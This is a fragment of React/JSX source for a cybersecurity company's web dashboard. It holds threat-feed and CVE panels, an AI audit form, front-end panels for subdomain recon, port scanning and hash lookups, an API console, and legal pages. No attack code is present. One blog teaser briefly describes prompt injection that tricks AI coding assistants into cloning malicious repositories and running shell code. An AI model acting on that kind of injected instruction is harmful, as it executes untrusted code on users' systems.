                    <div className="text-3xl font-extrabold text-[#ef4444] font-mono tracking-tight">7.4 <span className="text-xs text-slate-500">/ 10</span></div>
                    <p className="text-[11px] text-slate-400 leading-snug">Multiple high-severity CVE releases on authentication mechanisms have been published. Immediate patch enforcement recommended on enterprise gateways.</p>
                  </div>
                  <div className="pt-3 border-t border-slate-900 text-[10px] text-slate-500 font-mono">
                    Updated: {new Date().toLocaleTimeString()} &bull; NVD NIST Feed
                  </div>
                </div>

              </div>

            </div>

            {/* Live Threat Feed and CVE Database Workspace */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Left Side: Real-time Ingestion alerts */}
              <div className="lg:col-span-7 bg-[#0c1117] border border-slate-800 rounded-lg overflow-hidden flex flex-col">
                <div className="px-4 py-3 border-b border-slate-800 bg-slate-900/50 flex justify-between items-center">
                  <h3 className="text-xs font-bold text-slate-300 uppercase tracking-widest font-mono flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                    Sentinel Live Ingestion Feed
                  </h3>
                  <button 
                    onClick={() => fetchThreatFeed()} 
                    disabled={loadingFeed}
                    className="text-cyan-500 hover:text-cyan-400 p-1 rounded hover:bg-slate-800 disabled:opacity-50 transition-colors"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${loadingFeed ? 'animate-spin' : ''}`} />
                  </button>
                </div>

                <div className="flex-1 overflow-x-auto">
                  <table className="w-full text-left text-[11px] font-mono whitespace-nowrap">
                    <thead>
                      <tr className="bg-slate-950 text-slate-500 border-b border-slate-800">
                        <th className="p-3 pl-4">ID</th>
                        <th className="p-3">SOURCE IP</th>
                        <th className="p-3">VECTOR TYPE</th>
                        <th className="p-3">RISK LEVEL</th>
                        <th className="p-3 pr-4 text-right">ACTION</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      {alerts.map((alert) => (
                        <tr 
                          key={alert.id} 
                          className="hover:bg-slate-900/50 cursor-pointer transition-colors"
                          onClick={() => handleSelectAlert(alert)}
                        >
                          <td className="p-3 pl-4 font-bold text-slate-400">{alert.id}</td>
                          <td className="p-3 text-slate-300">{alert.sourceIp}</td>
                          <td className="p-3 text-slate-400 truncate max-w-[180px]">{alert.threatType}</td>
                          <td className="p-3">{getSeverityBadge(alert.severity)}</td>
                          <td className="p-3 pr-4 text-right">
                            <button 
                              className="px-2 py-1 rounded text-[10px] font-bold bg-cyan-950 text-cyan-400 border border-cyan-800/60 hover:bg-cyan-500 hover:text-black hover:border-transparent transition-all"
                              onClick={(e) => {
                                e.stopPropagation();
                                handleSelectAlert(alert);
                              }}
                            >
                              Investigate
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Right Side: CVE Intelligence Database */}
              <div className="lg:col-span-5 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between">
                <div className="space-y-3">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center justify-between">
                    <span>CVE Intelligence Alert Database</span>
                    <span className="bg-red-950 text-red-400 border border-red-900 text-[9px] px-1.5 py-0.5 rounded font-normal font-mono">CVSS 9.0+</span>
                  </h3>

                  <div className="space-y-4 max-h-[300px] overflow-y-auto pr-1">
                    {cves.map((cve) => (
                      <div key={cve.id} className="bg-slate-950 p-3 rounded border border-slate-900 space-y-1.5">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-red-400 font-mono">{cve.id}</span>
                          <span className="text-[10px] text-slate-500 font-mono">{cve.published}</span>
                        </div>
                        <h4 className="text-[11px] text-slate-200 font-bold leading-tight">{cve.title}</h4>
                        <p className="text-[10px] text-slate-500 font-mono">
                          <span className="text-cyan-500">Mitigation:</span> {cve.mitigation}
                        </p>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="pt-3 border-t border-slate-900 text-[10px] text-slate-500 font-mono flex items-center gap-1.5 mt-4">
                  <Info className="w-3.5 h-3.5 text-cyan-500" />
                  <span>Cross-referenced against verified CISA KEV listings</span>
                </div>
              </div>

            </div>

          </div>
        )}

        {/* ================= VIEW 3: AI SECURITY HUB (WORKSPACE) ================= */}
        {currentView === "ai" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-emerald-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">AI Security &amp; Compliance Hub</h2>
              <p className="text-xs text-slate-500">Leverage advanced server-side Gemini intelligence models to run static scans, compliance checks, and threat audit calculations.</p>
            </div>

            {/* AI Workspace layout splits */}
            <div className="bg-[#0c1117] border border-slate-800 rounded-lg flex flex-col overflow-hidden min-h-[480px]">
              
              {/* Sub tabs selector */}
              <div className="border-b border-slate-800 bg-slate-950 p-1.5 flex overflow-x-auto gap-1">
                {[
                  { id: "log", title: "Log File Audit", icon: Terminal },
                  { id: "code", title: "SAST Code Scanner", icon: Code },
                  { id: "domain", title: "Threat Intel Checker", icon: Globe },
                  { id: "compliance", title: "DPDP & SOC2 Auditor", icon: FileCheck },
                  { id: "chat", title: "Architect Consultation", icon: Shield }
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveAiTab(tab.id as any)}
                    className={`px-3 py-1.5 rounded text-xs font-mono font-bold flex items-center gap-1.5 shrink-0 transition-all ${
                      activeAiTab === tab.id ? "bg-cyan-950 text-cyan-400 border border-cyan-800/80" : "text-slate-500 hover:text-slate-300 hover:bg-slate-900/50"
                    }`}
                  >
                    <tab.icon className="w-3.5 h-3.5" /> {tab.title}
                  </button>
                ))}
              </div>

              {/* Input-Output Form panel */}
              <form onSubmit={handleAnalyze} className="flex-1 flex flex-col p-4 md:p-6 gap-6">
                <div className="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-6">
                  
                  {/* Left block - input form */}
                  <div className="flex flex-col gap-3">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Target Payload Input</span>
                      <button 
                        type="button" 
                        onClick={() => applyPresetTemplate(activeAiTab)}
                        className="text-[9px] font-mono text-slate-400 hover:text-cyan-400 border border-slate-800 px-2 py-0.5 rounded bg-slate-950"
                      >
                        Reset Template
                      </button>
                    </div>

                    <textarea
                      className="flex-1 w-full bg-slate-950 border border-slate-800 rounded p-4 text-xs font-mono text-slate-200 placeholder-slate-700 focus:outline-none focus:border-cyan-500/60 resize-none min-h-[220px]"
                      value={analyzerInput}
                      onChange={(e) => setAnalyzerInput(e.target.value)}
                      placeholder="Paste targets or codes here..."
                    />

                    <button
                      type="submit"
                      disabled={analyzerLoading || !analyzerInput.trim()}
                      className="w-full bg-cyan-500 hover:bg-cyan-400 text-black py-3 px-4 rounded font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 disabled:opacity-50 transition-all cursor-pointer font-sans shadow-md"
                    >
                      {analyzerLoading ? (
                        <>
                          <RefreshCw className="w-4 h-4 animate-spin" />
                          Analyzing targets on Active server models...
                        </>
                      ) : (
                        <>
                          <Zap className="w-4 h-4 fill-black" />
                          Execute Real AI Security Audit
                        </>
                      )}
                    </button>
                  </div>

                  {/* Right block - output response */}
                  <div className="flex flex-col gap-3 bg-slate-950 rounded border border-slate-800 p-4">
                    <div className="flex items-center justify-between border-b border-slate-900 pb-2">
                      <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest flex items-center gap-1.5">
                        <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                        AI Shield Report Terminal
                      </span>
                      {analyzerLoading && (
                        <span className="text-[9px] font-mono text-cyan-400 animate-pulse uppercase">
                          INGESTING STREAM...
                        </span>
                      )}
                    </div>

                    <div className="flex-1 overflow-y-auto text-xs leading-relaxed space-y-4 font-mono text-slate-300 select-text max-h-[360px]">
                      {analyzerReport ? (
                        <div className="prose prose-invert prose-xs whitespace-pre-wrap">
                          {analyzerReport}
                        </div>
                      ) : (
                        <div className="h-full flex flex-col items-center justify-center text-center text-slate-600 p-6 space-y-2">
                          <Shield className="w-10 h-10 text-slate-800" />
                          <p className="text-xs font-semibold text-slate-500 uppercase tracking-wider">No Active Audit Compiled</p>
                          <p className="text-[11px] text-slate-600 max-w-xs">Write or edit your input in the left console and click execute to receive verified neural insights.</p>
                        </div>
                      )}
                    </div>
                  </div>

                </div>
              </form>

            </div>

          </div>
        )}

        {/* ================= VIEW 4: THREATCORE SECURITY TOOLS ================= */}
        {currentView === "tools" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-purple-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">ThreatCore™ Security Tools Portal</h2>
              <p className="text-xs text-slate-500">Access, run, and query 100+ simulated production security tools directly in your workspace sandbox.</p>
            </div>

            {/* Three key interactive security scanners */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Tool 1: Subdomain Certificate Scout */}
              <div className="lg:col-span-6 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between space-y-4">
                <div className="space-y-1">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                    <Globe className="w-4 h-4 text-cyan-500" />
                    Subdomain CT Recon Scout
                  </h3>
                  <p className="text-[10px] text-slate-500">Brute-force DNS prefix mapping &amp; query Certificate Transparency logs.</p>
                </div>

                <div className="space-y-3">
                  <div className="flex gap-2">
                    <input 
                      type="text" 
                      value={toolSubdomainInput}
                      onChange={(e) => setToolSubdomainInput(e.target.value)}
                      className="flex-1 bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-cyan-500"
                      placeholder="e.g. cyberdudebivash.com"
                    />
                    <button
                      onClick={runSubdomainScout}
                      disabled={scoutingActive}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-1.5 rounded text-xs font-extrabold uppercase transition-all disabled:opacity-50"
                    >
                      Scout
                    </button>
                  </div>

                  {/* Scout Output Console */}
                  <div className="bg-slate-950 border border-slate-900 rounded p-3 h-48 overflow-y-auto font-mono text-[10px] text-slate-400 space-y-1">
                    {scoutLogs.length === 0 ? (
                      <span className="text-slate-600 block italic">Awaiting target domain input. Click scout to resolve routes.</span>
                    ) : (
                      scoutLogs.map((log, idx) => (
                        <div key={idx} className="truncate">{log}</div>
                      ))
                    )}

                    {scoutResults.length > 0 && (
                      <div className="pt-2 mt-2 border-t border-slate-900 space-y-1 text-emerald-400">
                        <div className="font-bold">[RESOLVED SUBDOMAINS]</div>
                        {scoutResults.map((res, idx) => (
                          <div key={idx} className="flex justify-between gap-2">
                            <span>{res.subdomain}</span>
                            <span className="text-slate-500">[{res.ip}] Status {res.status}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Tool 2: SYN Port Scanner */}
              <div className="lg:col-span-6 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between space-y-4">
                <div className="space-y-1">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                    <Terminal className="w-4 h-4 text-purple-400" />
                    SYN Port Scanner Probe
                  </h3>
                  <p className="text-[10px] text-slate-500">Map and probe open industrial ports against target IP host.</p>
                </div>

                <div className="space-y-3">
                  <div className="flex gap-2">
                    <input 
                      type="text" 
                      value={toolPortInput}
                      onChange={(e) => setToolPortInput(e.target.value)}
                      className="flex-1 bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-cyan-500"
                      placeholder="e.g. 103.142.12.98"
                    />
                    <button
                      onClick={runPortScan}
                      disabled={portScanningActive}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-1.5 rounded text-xs font-extrabold uppercase transition-all disabled:opacity-50"
                    >
                      Scan Port
                    </button>
                  </div>

                  {/* Port Output Console */}
                  <div className="bg-slate-950 border border-slate-900 rounded p-3 h-48 overflow-y-auto font-mono text-[10px] text-slate-400 space-y-1">
                    {portScanLogs.length === 0 ? (
                      <span className="text-slate-600 block italic">Awaiting IP address input. Click scan to map targets.</span>
                    ) : (
                      portScanLogs.map((log, idx) => (
                        <div key={idx} className="truncate">{log}</div>
                      ))
                    )}

                    {portScanResults.length > 0 && (
                      <div className="pt-2 mt-2 border-t border-slate-900 space-y-1 text-cyan-400">
                        <div className="font-bold">[PROBED PORT STATUS]</div>
                        {portScanResults.map((res, idx) => (
                          <div key={idx} className="flex justify-between gap-2">
                            <span>PORT {res.port} &bull; {res.service}</span>
                            <span className="text-slate-500">[{res.state}]</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>

            </div>

            {/* Tool 3: Malware Hash Reputation lookup */}
            <div className="bg-[#0c1117] border border-slate-800 rounded-lg p-6 space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                  <Shield className="w-4 h-4 text-emerald-500" />
                  Malware File Hash Reputation Tracker
                </h3>
                <p className="text-[10px] text-slate-500">Query SHA-256 signatures to check reputation indexes against Cozy Bear, LockBit, or standard dropper databases.</p>
              </div>

              <div className="space-y-4">
                <div className="flex flex-col sm:flex-row gap-3">
                  <input 
                    type="text" 
                    value={hashInput}
                    onChange={(e) => setHashInput(e.target.value)}
                    className="flex-1 bg-slate-950 border border-slate-800 rounded px-4 py-2 text-xs font-mono focus:outline-none focus:border-cyan-500"
                    placeholder="Enter SHA-256 target hash"
                  />
                  <div className="flex gap-2">
                    <button
                      onClick={runHashCheck}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-6 py-2 rounded text-xs font-extrabold uppercase transition-all shrink-0 cursor-pointer"
                    >
                      Check Signature
                    </button>
                    <button
                      onClick={() => setHashInput("6a4f12de9b3c4f71a9ee08310c111bbfe9922e334a179bf88aa25e3b0c4083a2")}
                      className="bg-slate-900 hover:bg-slate-800 text-slate-400 border border-slate-800 px-3 py-2 rounded text-xs font-mono shrink-0"
                    >
                      Try Bad Hash
                    </button>
                  </div>
                </div>

                {hashReport && (
                  <div className="bg-slate-950 border border-slate-900 rounded p-4 font-mono text-xs text-slate-300 whitespace-pre-wrap leading-relaxed">
                    {hashReport}
                  </div>
                )}
              </div>
            </div>

          </div>
        )}

        {/* ================= VIEW 5: RESEARCH BLOG & ACADEMY ================= */}
        {currentView === "blog" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-amber-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">Cybersecurity Research Blog &amp; Academy</h2>
              <p className="text-xs text-slate-500">Explore technical advisories, zero-day CVE teardowns, and course modules delivered directly from our training coordinators.</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Blog posts list */}
              <div className="lg:col-span-8 space-y-4">
                <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest">Recent Threat Advisories</h3>
                
                {[
                  {
                    title: "Deep-Dive Teardown of DirtyClone (CVE-2026-43503) Linux Privilege Escalation",
                    desc: "An exhaustive static and behavioral walkthrough of the DirtyClone memory corruption flaw allowing unprivileged users to silently rewrite executable code segments directly in kernel buffers.",
                    meta: "Published: June 26, 2026 &bull; Author: Bivash Kumar Nayak &bull; Category: Kernel exploits"
                  },
                  {
                    title: "MFA Bypass via Adversary-in-the-Middle (AiTM) Phishing Kits: Bluekit Operational Report",
                    desc: "Our threat intelligence scouts have tracked nearly 70 active hostnames distributing browser-in-the-middle proxy configurations. Analysis of OIDC token stealing patterns and direct countermeasures.",
                    meta: "Published: June 24, 2026 &bull; Author: Sentinel APEX Team &bull; Category: Phishing analysis"
                  },
                  {
                    title: "OWASP Top 10 Mapping for Large Language Models: Prompt Injection Vectors Explored",
                    desc: "How prompt injections bypass sanitization logic to trick AI coding assistants into clining malicious subrepositories and executing local OS shell codes.",
                    meta: "Published: June 20, 2026 &bull; Author: CyberDude Research Lab &bull; Category: LLM Security"
                  }
                ].map((post, idx) => (
                  <div key={idx} className="bg-[#0c1117] border border-slate-800 p-5 rounded-lg space-y-2 hover:border-slate-700 transition-all">
                    <h4 className="text-sm font-extrabold text-slate-100 hover:text-cyan-400 transition-colors cursor-pointer">{post.title}</h4>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{post.desc}</p>
                    <div className="pt-2 flex justify-between items-center text-[10px] font-mono text-slate-500">
                      <span dangerouslySetInnerHTML={{ __html: post.meta }}></span>
                      <span className="text-cyan-500 hover:underline cursor-pointer">Read Full Intel →</span>
                    </div>
                  </div>
                ))}
              </div>

              {/* Course Academy pre-views */}
              <div className="lg:col-span-4 space-y-4">
                <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest">Ecosystem Academy Courses</h3>

                <div className="space-y-4">
                  {[
                    { title: "SOC Analyst Runbook (Tier 1-3)", cost: "₹499", level: "Intermediate", desc: "Build incident response playbooks, learn SPL/KQL alerts, and run network forensics." },
                    { title: "AI Red Teaming & LLM Security", cost: "₹999", level: "Advanced", desc: "Hardening LLM data flows, writing secure API code, testing prompt injections." },
                    { title: "Active OSINT & Threat Hunting", cost: "₹699", level: "Beginner-Intermediate", desc: "Querying CT logs, WHOIS metadata, certificate mappings, and hash reputations." }
                  ].map((course, idx) => (
                    <div key={idx} className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-2.5">
                      <div className="flex justify-between items-start">
                        <span className="text-xs font-extrabold text-slate-200 leading-tight">{course.title}</span>
                        <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950 px-1 py-0.5 rounded border border-emerald-900">{course.cost}</span>
                      </div>
                      <p className="text-[11px] text-slate-500 leading-snug font-sans">{course.desc}</p>
                      <div className="flex justify-between items-center text-[10px] font-mono">
                        <span className="text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded border border-cyan-900/60">Level: {course.level}</span>
                        <button className="text-slate-300 hover:text-cyan-400 font-bold flex items-center gap-1">
                          <Play className="w-3 h-3 fill-slate-300 hover:fill-cyan-400" /> Start Course
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

            </div>

          </div>
        )}

        {/* ================= VIEW 6: PROGRAMMABLE API WORKSPACE ================= */}
        {currentView === "api" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-red-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">Monetization Core™ Rest API Portal</h2>
              <p className="text-xs text-slate-500">Programmatically ingest global threat matrices directly into your local Splunk, Microsoft Sentinel, or IBM QRadar SIEM stack.</p>
            </div>

            {/* Interactive API Key manager & test console */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Left sidebar: 8 Ecosystem REST Endpoints list */}
              <div className="lg:col-span-5 space-y-4">
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-3">
                  <div className="flex items-center justify-between border-b border-slate-900 pb-2">
                    <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest">Ecosystem Route Registry</h3>
                    <span className="text-[9px] font-mono text-cyan-400 bg-cyan-950/80 px-1.5 py-0.5 rounded border border-cyan-900/30">8 endpoints</span>
                  </div>
                  
                  <div className="space-y-2 max-h-[350px] overflow-y-auto pr-1">
                    {ECOSYSTEM_APIS.map((api, idx) => {
                      const isSelected = activeEcosystemApiIndex === idx;
                      return (
                        <button
                          key={idx}
                          onClick={() => executeEcosystemApiRequest(idx)}
                          className={`w-full text-left p-2.5 rounded border transition-all flex flex-col space-y-1.5 cursor-pointer ${
                            isSelected 
                              ? "bg-cyan-950/50 border-cyan-500/50 text-slate-200" 
                              : "bg-slate-950/55 border-slate-900 text-slate-400 hover:border-slate-800 hover:bg-slate-900/40"
                          }`}
                        >
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-mono text-cyan-400 font-bold tracking-tight truncate max-w-[200px]">{api.url}</span>
                            <span className="text-[8px] font-mono text-slate-500 uppercase tracking-wider">{api.responseType}</span>
                          </div>
                          <div className="space-y-0.5">
                            <h5 className="text-[10px] font-bold text-slate-300 uppercase tracking-wide">{api.path}</h5>
                            <p className="text-[9px] text-slate-500 leading-snug line-clamp-1">{api.description}</p>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* API Credentials card */}
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-4">
                  <div className="space-y-2">
                    <label className="block text-[9px] font-mono text-slate-500 uppercase tracking-widest">Active API Client Token</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        readOnly 
                        value={apiKey}
                        className="flex-1 bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 text-xs font-mono text-slate-400 focus:outline-none"
                      />
                      <button 
                        onClick={() => setApiKey("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000))}
                        className="bg-slate-900 hover:bg-slate-800 text-slate-400 border border-slate-800 px-2.5 py-1.5 rounded text-xs font-mono cursor-pointer"
                      >
                        Rotate
                      </button>
                    </div>
                  </div>

                  <div className="space-y-2 font-mono text-[10px] text-slate-450">
                    <div className="flex justify-between border-b border-slate-900 pb-1">
                      <span>Access Tier</span>
                      <span className="text-emerald-400 font-bold">PRO SUBNET INTEGRITY</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-900 pb-1">
                      <span>Rate Limit</span>
                      <span>1,000 req / min</span>
                    </div>
                    <div className="flex justify-between">
                      <span>Node Location</span>
                      <span className="text-cyan-500">Jajpur, Odisha Hub</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Live console playground code response block */}
              <div className="lg:col-span-7 bg-[#0c1117] border border-slate-800 rounded-lg p-5 flex flex-col overflow-hidden">
                <div className="flex items-center justify-between border-b border-slate-900 pb-2 mb-3">
                  <span className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest">SIEM / Client shell query</span>
                  <div className="flex items-center gap-1.5 text-[9px] font-mono text-emerald-400">
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                    HTTPS SECURE GCM-256
                  </div>
                </div>

                <div className="bg-slate-950 border border-slate-900 rounded p-3.5 font-mono text-[10px] text-slate-400 select-text mb-4 leading-relaxed">
                  {`curl -X GET \\
  "https://intel.cyberdudebivash.com${ECOSYSTEM_APIS[activeEcosystemApiIndex]?.url || "/api"}" \\
  -H "Authorization: Bearer ${apiKey}" \\
  -H "Content-Type: application/json"`}
                </div>

                <div className="flex items-center justify-between mb-2">
                  <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Response Output Console</span>
                  <button 
                    onClick={() => executeEcosystemApiRequest(activeEcosystemApiIndex)}
                    className="bg-cyan-500 hover:bg-cyan-400 text-black px-3 py-1 rounded text-[10px] font-extrabold uppercase tracking-wider transition-all cursor-pointer flex items-center gap-1"
                  >
                    <Send className="w-3 h-3" /> Execute Request
                  </button>
                </div>
                
                <div className="flex-1 bg-slate-950 border border-slate-900 rounded p-4 font-mono text-[11px] text-emerald-400 select-text overflow-y-auto max-h-[380px] whitespace-pre-wrap leading-relaxed">
                  {apiConsoleResponse}
                </div>
              </div>

            </div>

          </div>
        )}

      </div>

      {/* ===== COMPLIANCE PAGES ===== */}
      {(currentView === "about" || currentView === "privacy" || currentView === "terms" || currentView === "copyright") && (
        <div className="min-h-[60vh] bg-[#030912] border-t border-slate-800/60">
          <div className="max-w-4xl mx-auto px-6 py-12">
            <button onClick={() => setCurrentView("home")} className="mb-8 text-xs text-slate-500 hover:text-cyan-400 transition-colors flex items-center gap-2 font-mono">
              ← Back to Gateway
            </button>

            {currentView === "about" && (
              <div className="space-y-8">
                <div>
                  <div className="text-[10px] font-mono text-cyan-500 uppercase tracking-widest mb-2">About</div>
                  <h1 className="text-2xl font-bold text-white mb-4">About CyberDudeBivash<span className="text-cyan-400">®</span></h1>
                  <p className="text-slate-300 leading-relaxed text-sm">CYBERDUDEBIVASH PRIVATE LIMITED is an India-based autonomous AI-powered cybersecurity defense company founded in 2020, headquartered in Ragadi, Jajpur Road, Odisha. We deliver real-time threat intelligence, managed SOC operations, AI security auditing, and 100+ production-grade security tools to enterprise teams globally.</p>
                </div>
                <div className="grid md:grid-cols-2 gap-6">
                  {[
                    { title: "Mission", body: "To democratize enterprise-grade cybersecurity with AI-native tools, real-time threat intelligence, and autonomous SOC operations — protecting organizations of every scale." },
                    { title: "Vision", body: "To be India's premier global cybersecurity authority, setting the standard for AI-driven threat defense in the Asia-Pacific region and beyond." },
                    { title: "Founded", body: "2020, Odisha, India. Registered under the Companies Act 2013. Government GSTIN: 21ARKPN8270G1ZP. PAN: ARKPN8270G." },
                    { title: "Founder", body: "Bivasha Kumar Nayak — Cybersecurity Engineer, Threat Intelligence Specialist, and OWASP contributor based in Jajpur Road, Odisha, India." },
                  ].map(c => (
                    <div key={c.title} className="bg-slate-900/50 border border-slate-800 rounded-xl p-5">
                      <h3 className="text-sm font-bold text-cyan-400 mb-2">{c.title}</h3>
                      <p className="text-xs text-slate-400 leading-relaxed font-sans">{c.body}</p>
                    </div>
                  ))}
                </div>
                <div className="bg-slate-900/50 border border-slate-800 rounded-xl p-5 space-y-2">
                  <h3 className="text-sm font-bold text-white mb-3">Corporate Identity</h3>
                  {[
                    ["Legal Name", "CYBERDUDEBIVASH PRIVATE LIMITED"],
                    ["Brand", "CyberDudeBivash®"],
                    ["Incorporation", "Companies Act 2013, India"],
                    ["PAN", "ARKPN8270G"],
                    ["GSTIN", "21ARKPN8270G1ZP"],
                    ["Address", "29, Korai-Sukinda Rd, Ragadi, JAJPUR ROAD, Odisha 755019, India"],
                    ["Email", "bivash@cyberdudebivash.com"],
                    ["Phone", "+91 81798 81447"],
                    ["Hours", "Monday–Saturday, 9AM–7PM IST"],
                  ].map(([k, v]) => (
                    <div key={k} className="flex gap-4 text-xs font-mono">
                      <span className="text-slate-500 w-28 shrink-0">{k}</span>
                      <span className="text-slate-300">{v}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {currentView === "privacy" && (
              <div className="space-y-8">
                <div>
                  <div className="text-[10px] font-mono text-emerald-500 uppercase tracking-widest mb-2">Legal</div>
                  <h1 className="text-2xl font-bold text-white mb-2">Privacy Policy</h1>
                  <p className="text-xs text-slate-500 font-mono">Last updated: June 2026 · Effective immediately · Compliant with India DPDP Act 2023 & GDPR</p>
                </div>
                {[
                  { title: "1. Data Controller", body: "CYBERDUDEBIVASH PRIVATE LIMITED (\"CyberDudeBivash\", \"we\", \"our\") is the Data Fiduciary under India's Digital Personal Data Protection Act 2023 and Data Controller under GDPR for all personal data processed through our platforms and services." },
                  { title: "2. Data We Collect", body: "Contact information (name, email, phone) submitted through enterprise inquiry forms; usage analytics (page views, session duration) via privacy-respecting analytics; security telemetry data from opted-in SOC deployments; API usage metadata for rate limiting and billing. We do NOT collect sensitive personal data without explicit consent." },
                  { title: "3. Purpose of Processing", body: "Delivering requested cybersecurity services; responding to enterprise inquiries and support requests; improving platform functionality; compliance monitoring and audit logging as required by our certifications (ISO 27001, SOC 2 Type II); sending transactional communications related to services you've subscribed to." },
                  { title: "4. Data Localisation (DPDP Act)", body: "All personal data of Indian residents is stored on servers located within the Republic of India (Jajpur, Odisha). Cross-border transfers are conducted only to approved jurisdictions per the DPDP Act 2023 schedules and under appropriate safeguards." },
                  { title: "5. Your Rights", body: "Under DPDP Act 2023 & GDPR: Right to access your personal data; right to correction of inaccurate data; right to erasure; right to withdraw consent; right to nominate a successor for data after death (DPDP-specific); right to grievance redressal. Submit requests to: bivash@cyberdudebivash.com" },
                  { title: "6. Breach Notification", body: "In the event of a personal data breach affecting your data, we will notify the Data Protection Board of India and affected individuals within 72 hours of becoming aware, as mandated by the DPDP Act 2023 and CERT-In guidelines." },
                  { title: "7. Cookies", body: "We use strictly necessary cookies for session management and security. No third-party tracking cookies. No advertising cookies. You may disable cookies via your browser settings, though this may affect platform functionality." },
                  { title: "8. Contact", body: "Data Protection Officer: Bivasha Kumar Nayak · bivash@cyberdudebivash.com · CYBERDUDEBIVASH PRIVATE LIMITED, 29 Korai-Sukinda Rd, Ragadi, Jajpur Road, Odisha 755019, India" },
                ].map(s => (
                  <div key={s.title} className="border-l-2 border-slate-700 pl-4">
                    <h3 className="text-sm font-bold text-slate-200 mb-1.5">{s.title}</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{s.body}</p>
                  </div>
                ))}
              </div>
            )}

            {currentView === "terms" && (
              <div className="space-y-8">
                <div>
                  <div className="text-[10px] font-mono text-violet-400 uppercase tracking-widest mb-2">Legal</div>
                  <h1 className="text-2xl font-bold text-white mb-2">Terms of Service</h1>
                  <p className="text-xs text-slate-500 font-mono">Last updated: June 2026 · Governing law: India (IT Act 2000, Companies Act 2013)</p>
                </div>
                {[
                  { title: "1. Acceptance", body: "By accessing any CYBERDUDEBIVASH platform, tool, or API, you agree to be bound by these Terms of Service. If you do not agree, you must discontinue use immediately." },
                  { title: "2. Authorized Use", body: "Our platforms are for legitimate cybersecurity defense, threat intelligence, compliance, and educational purposes only. Any use for offensive operations against third parties, unauthorized access, or activities prohibited under the Indian IT Act 2000 Section 43/66 is strictly forbidden and will be reported to CERT-In and law enforcement." },
                  { title: "3. Intellectual Property", body: "All content, trademarks, brand names (CyberDudeBivash®, Sentinel APEX™, ThreatCore™), logos, tools, APIs, SIGMA rules, playbooks, and documentation are the exclusive intellectual property of CYBERDUDEBIVASH PRIVATE LIMITED. Unauthorized reproduction, distribution, or commercial use is prohibited under the Copyright Act 1957 and Indian trademark law." },
